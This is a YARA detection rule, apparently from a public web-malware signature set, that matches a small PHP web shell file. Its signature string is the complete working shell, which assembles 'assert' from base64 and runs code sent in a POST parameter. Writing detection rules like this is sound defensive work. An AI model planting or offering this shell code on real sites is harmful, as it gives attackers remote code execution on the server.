rule infected_09_30_18_shell_b {
  meta:
    description = "shell4 - file b.php"
    author      = "Brian Laskowski"
    reference   = "https://github.com/Hestat/lw-yara/"
    date        = "2018-09-30"
    hash1       = "bd1fed42c3a343c198c0478dd5a39c0a7048990eb1b96ea57bd635808a6b4412"

  strings:
    $s1 = "<?php $c=base64_decode('YXNzZXI=').$_GET['n'].'t';@$c($_POST['x']);?>abcabcabc" fullword ascii

  condition:
    (uint16(0) == 0x3f3c and
      filesize < 1KB and
      (all of them)
    ) or (all of them)
}